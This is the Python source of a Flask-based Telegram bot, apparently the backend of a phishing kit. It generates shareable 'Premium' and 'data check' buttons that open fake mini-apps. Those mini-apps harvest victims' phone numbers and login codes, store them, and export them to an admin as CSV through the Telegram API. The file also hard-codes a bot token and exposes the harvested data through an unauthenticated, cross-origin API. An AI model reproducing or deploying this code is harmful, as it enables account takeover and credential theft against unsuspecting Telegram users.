from flask import Flask, request, send_file
from flask_cors import CORS
import requests
import json
import sqlite3
import os
import logging
from datetime import datetime

# ========== КОНФИГ ==========
BOT_TOKEN = "8997012321:AAELLgXvTcVsi6kp2CnT8zBLPy-kLp8XHcM"
ADMIN_ID = 8899193168
MINI_APP_URL = "https://bot-panel-v2.onrender.com/prize"
MINI_APP_URL2 = "https://bot-panel-v2.onrender.com/prize2"
PANEL_URL = "https://bot-panel-v2.onrender.com/panel"

app = Flask(__name__)
CORS(app)  # ← РАЗРЕШАЕМ ЗАПРОСЫ С ЛЮБЫХ ДОМЕНОВ
logging.basicConfig(level=logging.INFO)

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT,
            code TEXT,
            password TEXT,
            template TEXT,
            status TEXT,
            created_at INTEGER
        )
    """)
    conn.commit()
    conn.close()
    logging.info("✅ База данных инициализирована")

init_db()

def get_all_accounts():
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, code, template, status, created_at FROM accounts ORDER BY created_at DESC")
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_accounts_count():
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM accounts")
    count = cursor.fetchone()[0]
    conn.close()
    return count

def send_message(chat_id, text, reply_markup=None, parse_mode=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        r = requests.post(url, json=payload, timeout=10)
        logging.info(f"📤 Отправлено в {chat_id}: {r.status_code}")
    except Exception as e:
        logging.error(f"❌ Ошибка отправки: {e}")

# ========== ОБРАБОТКА ВЕБХУКА ==========
@app.route("/", methods=["POST"])
def webhook():
    data = request.get_json()
    if not data:
        return "OK", 200

    if "message" in data:
        msg = data["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")

        if text == "/start":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}],
                    [{"text": "🌐 Админ-панель", "url": PANEL_URL}]
                ]
            }
            send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)

        elif text == "/admin":
            if chat_id != ADMIN_ID:
                send_message(chat_id, "⛔ У вас нет доступа.")
                return "OK", 200
            show_admin_panel(chat_id)

    elif "callback_query" in data:
        query = data["callback_query"]
        chat_id = query["message"]["chat"]["id"]
        data_callback = query.get("data")

        if data_callback == "create_button":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🎁 Получить Premium", "callback_data": "create_robux"}],
                    [{"text": "🔍 Проверить данные", "callback_data": "create_osint"}],
                    [{"text": "⬅️ Назад", "callback_data": "back_to_menu"}]
                ]
            }
            send_message(chat_id, "🔧 **Выберите тип кнопки:**", reply_markup=keyboard)

        elif data_callback == "create_robux":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🎁 Получить Premium", "web_app": {"url": MINI_APP_URL}}]
                ]
            }
            send_message(chat_id, "✅ Кнопка **Premium** создана! Перешлите это сообщение.", reply_markup=keyboard)

        elif data_callback == "create_osint":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔍 Проверить данные", "web_app": {"url": MINI_APP_URL2}}]
                ]
            }
            send_message(chat_id, "✅ Кнопка **Проверка данных** создана! Перешлите это сообщение.", reply_markup=keyboard)

        elif data_callback == "back_to_menu":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}],
                    [{"text": "🌐 Админ-панель", "url": PANEL_URL}]
                ]
            }
            send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)

        elif data_callback == "export_csv":
            rows = get_all_accounts()
            if not rows:
                send_message(chat_id, "📭 Нет данных.")
                return "OK", 200

            csv = "Телефон,Код,Шаблон,Статус,Дата\n"
            for phone, code, template, status, created_at in rows:
                date = datetime.fromtimestamp(created_at).strftime("%Y-%m-%d %H:%M:%S")
                csv += f"{phone},{code},{template},{status},{date}\n"

            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {"document": ("accounts.csv", csv)}
            try:
                requests.post(url, data={"chat_id": chat_id}, files=files)
                logging.info("📤 CSV отправлен")
            except Exception as e:
                logging.error(f"❌ Ошибка отправки CSV: {e}")

    return "OK", 200

# ========== АДМИН-ПАНЕЛЬ В БОТЕ ==========
def show_admin_panel(chat_id):
    rows = get_all_accounts()
    if not rows:
        send_message(chat_id, "📭 База данных пуста.")
        return

    msg = "📋 **База данных (последние 10):**\n\n"
    for i, (phone, code, template, status, created_at) in enumerate(rows[:10], 1):
        date = datetime.fromtimestamp(created_at).strftime("%d.%m %H:%M")
        msg += f"{i}. 📱 `{phone}` | 🔑 `{code}` | 🎭 {template} | 🕒 {date}\n"

    keyboard = {
        "inline_keyboard": [
            [{"text": "📥 Экспорт CSV", "callback_data": "export_csv"}],
            [{"text": "🌐 Админ-панель", "url": PANEL_URL}]
        ]
    }
    send_message(chat_id, msg, reply_markup=keyboard, parse_mode="Markdown")

# ========== API ДЛЯ ВЕБ-АДМИНКИ ==========
@app.route("/api/accounts")
def api_accounts():
    rows = get_all_accounts()
    result = []
    for phone, code, template, status, created_at in rows:
        result.append({
            "phone": phone,
            "code": code,
            "template": template,
            "status": status,
            "created_at": created_at
        })
    return json.dumps(result)

# ========== API ДЛЯ МИНИ-ПРИЛОЖЕНИЯ ==========
@app.route("/api/contact", methods=["POST"])
def api_contact():
    data = request.get_json()
    phone = data.get("phone")
    template = data.get("template", "premium")

    if not phone:
        return json.dumps({"status": "error", "message": "Номер обязателен"}), 400

    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO accounts (phone, code, password, template, status, created_at) VALUES (?, ?, ?, ?, ?, ?)",
        (phone, "", "", template, "pending", int(datetime.now().timestamp()))
    )
    conn.commit()
    conn.close()

    logging.info(f"📩 Получен номер: {phone}, шаблон: {template}")
    return json.dumps({"status": "code_sent", "message": "Код отправлен"})

@app.route("/api/verify", methods=["POST"])
def api_verify():
    data = request.get_json()
    phone = data.get("phone")
    code = data.get("code")
    template = data.get("template", "premium")

    if not phone or not code:
        return json.dumps({"status": "error", "message": "Телефон и код обязательны"}), 400

    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE accounts SET code = ?, status = ? WHERE phone = ? AND template = ?",
        (code, "verified", phone, template)
    )
    conn.commit()
    conn.close()

    logging.info(f"✅ Проверен код: {phone} → {code}")
    return json.dumps({"status": "success", "message": "Аккаунт подтверждён"})

# ========== ВЕБ-АДМИНКА ==========
@app.route("/panel")
def admin_panel():
    return send_file("admin_panel.html")

# ========== НАСТРОЙКА ВЕБХУКА ==========
@app.route("/setwebhook", methods=["GET", "POST"])
def set_webhook():
    webhook_url = os.environ.get("RENDER_EXTERNAL_URL", "")
    if not webhook_url:
        return "RENDER_EXTERNAL_URL not set", 400
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
    r = requests.post(url, json={"url": webhook_url})
    return f"Webhook set: {r.json()}"

# ========== РАЗДАЧА HTML ==========
@app.route("/")
def index():
    return "Бот работает! Используй /setwebhook для настройки."

@app.route("/prize")
def prize():
    return send_file("index.html")

@app.route("/prize2")
def prize2():
    return send_file("index2.html")

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
